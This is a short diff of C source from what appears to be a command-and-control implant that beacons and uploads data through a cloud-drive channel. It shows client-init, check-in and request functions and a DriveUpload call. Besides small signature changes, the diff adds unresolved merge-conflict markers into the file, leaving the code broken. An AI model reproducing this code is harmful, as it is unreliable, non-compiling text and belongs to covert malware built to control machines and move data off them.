@@ -311,6 +311,7 @@ VOID FreeDriveConfig
 	}
 }
 
+<<<<<<< HEAD
 DWORD GetNextCheckIn
 (
 	_In_ PSLIVER_DRIVE_CLIENT pSliverClient
@@ -323,6 +324,9 @@ DWORD GetNextCheckIn
 }
 
 PSLIVER_DRIVE_CLIENT DriveClientInit()
+=======
+PSLIVER_DRIVE_CLIENT DriveClientInit(VOID)
+>>>>>>> 57314d70845c5d9d109b9ab271df3facaa8f34bf
 {
 	LPSTR lpProxy = NULL;
 	PSLIVER_DRIVE_CLIENT pResult = NULL;
@@ -403,7 +407,7 @@ BOOL DriveSendRequest
 	return DriveUpload(&pSliverClient->DriveConfig, pData, cbData, szName);
 }
 
-PSLIVER_DRIVE_CLIENT DriveSessionInit()
+PSLIVER_DRIVE_CLIENT DriveSessionInit(VOID)
 {
 	DWORD cbResp = 0;
 	PSLIVER_DRIVE_CLIENT pSliverClient = NULL;
